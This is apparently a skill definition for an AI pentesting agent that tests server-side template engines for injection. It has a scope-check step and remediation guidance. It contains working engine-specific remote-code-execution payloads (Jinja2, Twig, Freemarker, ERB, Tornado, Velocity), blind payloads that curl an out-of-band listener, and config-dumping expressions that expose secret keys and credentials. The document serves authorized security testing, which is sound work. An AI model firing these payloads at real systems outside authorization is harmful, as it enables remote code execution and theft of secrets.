---
name: ssti-hunter
description: "Tests server-side template engines (Jinja2, Twig, Freemarker, ERB, Velocity, Tornado) for template injection that leads to RCE, config disclosure, or internal variable exposure. Use when an application reflects user input into dynamically-rendered pages, emails, or exported files; when error messages mention a known template engine; or when the orchestrator's recon surfaces `{{...}}`, `${...}`, or `<%...%>` metacharacters in responses. Produces findings with CWE-1336 / CWE-94 mapping, engine-fingerprinted PoCs, and framework-specific sandbox/allowlist remediation. Defensive testing only, against assets listed in .claude/security-scope.yaml."
model: opus
allowed-tools: >
  Read, Grep, Glob, Write(path:.claude/planning/**),
  WebFetch,
  Bash(curl:*), Bash(wget:*), Bash(httpx:*), Bash(ffuf:*),
  Bash(gobuster:*), Bash(nuclei:*), Bash(jq:*), Bash(arjun:*),
  Bash(gf:*), Bash(gau:*), Bash(waybackurls:*),
  Bash(nmap:--script=safe*), Bash(nmap:-sV), Bash(nmap:-Pn),
  Bash(dig:*), Bash(host:*), Bash(whois:*),
  Bash(openssl:s_client*), Bash(openssl:x509*)
metadata:
  version: 1.0.0
  category: security-testing
  subcategory: injection
  authorization_required: true
  tier: T1
  source_methodology: "Guia de Exploração e Mitigação de Injeção de Template (SSTI).md"
  service_affecting: false
  composed_from:
    - "Guia Completo de Testes e Mitigação de SSTI.md"
    - "Guia de Exploração e Mitigação de Injeção de Template (SSTI).md"
    - "Guia Técnico de Server-Side Template Injection (SSTI).md"
---

# SSTI Hunter

## Goal

Test server-side template engines for injection flaws that let user-supplied
content be evaluated as template directives — typically resulting in remote
code execution, config disclosure, or arbitrary attribute access. This skill
implements WSTG-INPV-18 and maps findings to CWE-1336 (Improper Neutralization
of Special Elements Used in a Template Engine) and CWE-94 (Improper Control
of Generation of Code / Code Injection). The goal is to give the engineering
team a concrete list of template expressions reachable from user input, with
engine-fingerprinted PoCs and framework-specific sandbox/allowlist
remediation for the engines in use (Jinja2, Twig, Freemarker, ERB, Velocity,
Tornado, Handlebars, Liquid).

## When to Use

- The target uses a server-side template engine to generate pages, emails,
  PDFs, CSVs, or exported documents.
- User-controlled input (URL params, POST bodies, headers, uploaded file
  content) is reflected in dynamically-rendered output.
- Error messages reveal a template-engine name (e.g., `jinja2.exceptions`,
  `freemarker.core.ParseException`, `twig.Error`).
- Functionality supports user-supplied markup: wiki pages, custom email
  templates, marketing-template editors, profile-bio fields, report
  builders.
- The orchestrator selects this skill after `web-recon-active` identifies
  math-reflecting endpoints or sees template metacharacters in responses.

## When NOT to Use

- For client-side template engines (AngularJS 1.x, Vue, Handlebars in the
  browser) — that's Client-Side Template Injection, handled by
  `xss-hunter` or `dom-xss-hunter` since the outcome is XSS not RCE.
- For SQL-based interpreters — use `sqli-hunter`.
- For OS-command injection where the flaw is direct shell interpolation,
  not template rendering — use `command-injection-hunter`.
- For deserialization flaws in template-adjacent code paths — use
  `deserialization-hunter`.
- Any asset not listed in `.claude/security-scope.yaml` or whose
  `testing_level` is not `active`.

## Authorization Check (MANDATORY FIRST STEP)

Before ANY outbound activity:

1. Read `.claude/security-scope.yaml`. If the file doesn't exist or doesn't
   parse, halt and report.
2. Confirm the intended target appears in the `assets` list AND its
   `testing_level` is `active`.
3. RCE confirmation uses only harmless commands (`whoami`, `id`,
   `hostname`, or `touch /tmp/ssti-probe-{timestamp}`). Do not pivot
   beyond initial confirmation — no internal reconnaissance, credential
   dumping, or persistence, even on in-scope assets. Record the finding
   and let `harden` drive the fix.
4. If the target is ambiguous, write it to
   `.claude/planning/{issue}/SCOPE_QUESTIONS.md` and halt for that target
   only.
5. Log the authorization check to
   `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log with
   status `running`.

## Inputs

The skill expects the caller to provide:

- `{issue}`: the planning folder name
- `{target}`: the asset identifier from security-scope.yaml
- `{scope_context}`: optional — specific endpoints or fields to focus on
  (e.g., `/admin/email-templates`, `user.bio`)
- `{user_a}`: authenticated session if endpoints are behind auth
- `{oob_listener}`: the authorized OOB listener URL (from scope) —
  required for blind-SSTI detection

## Methodology

### Phase 1: Identify Reflection Points

1. **Inventory user-reflecting fields** [Bug Bounty Bootcamp, Ch 16, p. 266]

   Do: Read `.claude/planning/{issue}/API_INVENTORY.md`. For each endpoint,
   identify fields whose values appear in rendered output: page titles,
   error messages, email templates, PDF exports, dashboard greetings,
   invoice line items.

   Vulnerable candidates: Fields reflected into HTML pages, emails, or
   server-generated files.

   Not-vulnerable candidates: Fields stored but never rendered, or fields
   that pass through a known-safe renderer (markdown-to-HTML via
   CommonMark, plain-text escape).

   Record: `.claude/planning/{issue}/ssti-targets.md`.

### Phase 2: Generic Math Probing

2. **Submit generic math probes** [WSTG v4.2, WSTG-INPV-18, p. 1203]

   Do: For each candidate field, submit each of these probes and diff the
   response against a baseline:

   ```
   {{7*7}}
   ${7*7}
   <%= 7*7 %>
   #{7*7}
   {{= 7*7 }}
   ```

   Vulnerable response: Response contains `49` where the probe was.

   Not-vulnerable response: Response contains the literal string
   `{{7*7}}` (or the html-encoded form `&#123;&#123;7*7&#125;&#125;`).

   Record: Note the engine family for each hit (the specific syntax that
   evaluated narrows the engine).

3. **Polyglot probe for engine detection**
   [Bug Bounty Bootcamp, Ch 16, p. 266]

   Do: For fields that don't reflect in pure math, submit the polyglot
   probe `{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]`. This triggers
   syntactic errors in whichever engine parses it.

   Vulnerable response: A verbose stack trace mentions the engine name
   (e.g., `jinja2.exceptions.UndefinedError: 'abcxx' is undefined`).

   Not-vulnerable response: The literal string is echoed, or a generic
   500 with no engine signal.

   Record: Engine identification per target field.

### Phase 3: Engine Fingerprinting

4. **Behavioral differentiation** [WSTG v4.2, WSTG-INPV-18, p. 1205]

   Do: For fields that evaluate math, submit engine-specific tests to
   distinguish similar engines:

   | Probe             | Jinja2    | Twig | Freemarker | ERB   | Velocity |
   |-------------------|-----------|------|------------|-------|----------|
   | `{{7*'7'}}`       | `7777777` | `49` | err        | err   | err      |
   | `${7*7}`          | N/A       | `49` | `49`       | N/A   | `49`     |
   | `<%= 7*7 %>`      | N/A       | N/A  | N/A        | `49`  | N/A      |
   | `#{7*7}`          | N/A       | N/A  | N/A        | `49`* | `49`     |
   | `{{ ''.__class__ }}` | Object repr | err | err | err | err   |

   Record: Commit to one engine per target before building RCE PoC.

### Phase 4: Break Out of Template Statements

5. **Statement breakout probing**
   [WSTG v4.2, WSTG-INPV-18, p. 1205]

   Do: When the field is inside a `{% ... %}` statement block (not a
   `{{ ... }}` expression), test statement-close + HTML injection:

   ```
   username}}
   %>
   ?>
   #*
   ```

   Vulnerable response: The injected tag (e.g., following `username}}`)
   appears in the response.

   Not-vulnerable response: Response is blank or the entire string is
   literalized.

   Record: Which fields are in statement context vs expression context —
   affects payload choice.

### Phase 5: RCE Proof-of-Concept (Harmless)

6. **Confirm OS access with harmless commands**
   [Bug Bounty Playbook V2, SSTI, p. 103]

   Do: Based on the fingerprinted engine, submit the ENGINE'S harmless-RCE
   payload:

   - Jinja2 (Python):
     `{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}`
   - Twig (PHP):
     `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}`
   - Freemarker (Java):
     `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}`
   - ERB (Ruby):
     `` <%= `whoami` %> `` or `<%= IO.popen('whoami').readlines() %>`
   - Tornado (Python):
     `{% import os %}{{os.popen('whoami').read()}}`
   - Velocity (Java):
     `#set($x=$request.getParameter("x"))#set($r=$x.getRuntime())#set($p=$r.exec("whoami"))...`
   - Handlebars (Node):
     `{{#with "constructor" as |c|}}{{#with "constructor" as |cc|}}...`

   Vulnerable response: Response contains the current user's name (e.g.,
   `www-data`, `apache`, `nginx`).

   Not-vulnerable response: The command string is rendered as literal
   text, the sandbox throws, or the engine denies attribute access.

   Record: Append FINDING-NNN with the request, the rendered response,
   the engine identified, and the exact payload used.

7. **Blind-SSTI confirmation via OOB** [Bug Bounty Bootcamp, Ch 16]

   Do: If no in-band reflection of command output is possible, use a
   blind payload that makes an HTTP request to the OOB listener:

   - Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('curl http://{oob_listener}/ssti-poc').read()}}`
   - ERB: `<% require 'open-uri'; open('http://{oob_listener}/ssti-poc') %>`

   Vulnerable response: Listener receives a hit from the target's IP.

   Not-vulnerable response: No listener hit.

   Record: FINDING-NNN with listener log as evidence.

### Phase 6: Config and Secret Disclosure (Gated)

8. **Config object enumeration** [Bug Bounty Bootcamp, Ch 16]

   Do: If full RCE is blocked (sandbox, restricted engine) but template
   evaluation works, enumerate framework-specific config objects:

   - Jinja2: `{{config}}`, `{{config.items()}}` — Flask config leaks
     `SECRET_KEY`, DB URLs, cloud credentials
   - Twig: `{{dump(_context)}}` — if dump is available, leaks variables
   - Freemarker: `${.globals}`, `${.vars}` — leaks globals
   - Velocity: `$servletContext.getAttributeNames()`

   Vulnerable response: Sensitive values in response (e.g., a Flask
   `SECRET_KEY`, DB URI, AWS key).

   Record: Each disclosed secret is its own FINDING-NNN with
   recommendation to rotate.

## Payload Library

Full engine-specific payloads in `references/payloads.md`. Categories:

- **Math probes**: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{{= 7*7 }}`
- **Polyglot detector**: `{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]`
- **Engine-differentiator**: `{{7*'7'}}`, `{{ ''.__class__ }}`,
  `${"freemarker.template.utility.Execute"?new()("id")}`
- **Jinja2 RCE**: config/mro/builtins chains for `os.popen`
- **Twig RCE**: `_self.env.registerUndefinedFilterCallback` and
  `_self.env.getFilter` chains
- **Freemarker RCE**: `freemarker.template.utility.Execute?new()` and
  `Freemarker.template.utility.JythonRuntime`
- **ERB RCE**: backtick and `IO.popen`
- **Tornado RCE**: `{% import subprocess %}` import chain
- **Velocity RCE**: `$request.getParameter + Runtime.getRuntime().exec`
- **Handlebars / Nunjucks**: constructor-based prototype pollution chains
- **Blind exfil**: per-engine `curl`/`http` payloads that ping OOB
- **Statement breakout**: `}}`, `%>`, `?>`, `#*`

## Output Format

Findings append to `.claude/planning/{issue}/SECURITY_AUDIT.md` per the
schema in `.claude/skills/_shared/finding-schema.md`.

Specific to this skill:

- **CWE**: CWE-1336 (Improper Neutralization of Special Elements Used in
  a Template Engine). For confirmed RCE, also add CWE-94 (Code
  Injection). For config disclosure only, add CWE-200.
- **OWASP**: WSTG-INPV-18. For APIs, map to OWASP API8:2019 (Injection).
- **CVSS vectors**: RCE typically
  `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`. Config-only disclosure:
  `...C:H/I:N/A:N`. Sandboxed evaluation with no escalation:
  `...C:L/I:L/A:N`.
- **Evidence**: the injected request, the response showing command output
  or secret disclosure, and the fingerprint evidence (which engine, from
  which probe).
- **Remediation framing**: backend engineer. Include engine-specific
  snippets in `references/remediation.md` — Jinja2
  (`SandboxedEnvironment`, `allowlist` on attrs), Twig (sandbox
  extension), Freemarker (`setNewBuiltinClassResolver`, `TemplateClassResolver.ALLOWS_NOTHING_RESOLVER`),
  ERB (use safe mode, or replace with Liquid / Mustache), Velocity
  (uberspector allowlist).

The skill also updates:

- `.claude/planning/{issue}/STATUS.md` — its row under Phase 7: Security
- `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log

## Quality Check (Self-Review)

Before marking complete, verify:

- [ ] Every finding has both a probe request AND either in-band reflection
      or an OOB listener log confirming execution
- [ ] Every RCE finding names the engine and cites the fingerprint probe
- [ ] No finding came from a character-stripping filter false positive
      (see Common Issues)
- [ ] No destructive payloads (rm, chmod, network scanning from target)
      were used — only whoami/id/hostname and HTTP OOB
- [ ] Probe requests removed any test files they created (`touch`
      probes) where possible
- [ ] Secret values discovered via config enumeration are redacted in the
      finding body (show first and last 4 chars, hash the rest) and
      paired with a rotation recommendation
- [ ] Skills Run Log row updated from `running` to `complete` or
      `halted:{reason}`

## Common Issues

- **Character-stripping false positive**: Input `{{4*4}}` returns
  `{{44}}` — a filter is stripping the `*` character rather than
  evaluating template syntax. The injection is inert. Confirm with
  `{{7*'7'}}` which returns a string multiplication in truly-vulnerable
  Jinja2 but is also stripped by a naive `*`-filter.

- **Literal reflection / cache hit**: The application echoes `49` not
  because of live evaluation but because the value `49` was previously
  saved in a user profile or cached response. Confirm by trying a
  distinctive probe like `{{9999*9999}}` → `99980001`; if that also
  reflects, evaluation is real.

- **Client-side framework evaluation**: AngularJS 1.x, Vue, or other
  browser-side engines evaluate `{{...}}` in the DOM. That's CSTI →
  XSS, not SSTI → RCE. Distinguish by inspecting whether the evaluation
  happens server-side (view-source shows the rendered result) or
  client-side (view-source shows the literal, DevTools shows it replaced).

- **Sandboxed engine with no escalation path**: Modern Jinja2
  `SandboxedEnvironment` blocks attribute access to `__class__`,
  `__builtins__`, etc. If probes reveal evaluation but every RCE path is
  blocked, the finding is "sandboxed SSTI" (Medium) not "RCE SSTI"
  (Critical). Still worth fixing because sandbox escapes are
  continuously discovered.

## References

- `references/payloads.md` — full engine-specific payload library

External:
- WSTG-INPV-18: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
- CWE-1336: https://cwe.mitre.org/data/definitions/1336.html
- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- PortSwigger SSTI research:
  https://portswigger.net/research/server-side-template-injection

## Source Methodology

Converted from (three SSTI notes merged per SESSION_CONTEXT directive;
most comprehensive methodology base — `Guia de Exploração...` — used as
the primary, with Tornado + ERB payload variants folded in from the
others):

- `pentest-agent-development/notebooklm-notes/Guia Completo de Testes e Mitigação de SSTI.md`
- `pentest-agent-development/notebooklm-notes/Guia de Exploração e Mitigação de Injeção de Template (SSTI).md`
- `pentest-agent-development/notebooklm-notes/Guia Técnico de Server-Side Template Injection (SSTI).md`

Grounded in:
- Bug Bounty Bootcamp, Ch 16 (SSTI)
- Bug Bounty Playbook V2 (SSTI chapter)
- The Web Application Hacker's Handbook, Ch 21 (Exploit Chaining)
- Web Hacking 101, Ch 16 (SSTI case studies)
- OWASP WSTG v4.2 (WSTG-INPV-18)
- PortSwigger SSTI research (engine-specific escalation payloads)

Conversion date: 2026-04-23
Conversion prompt version: 1.0
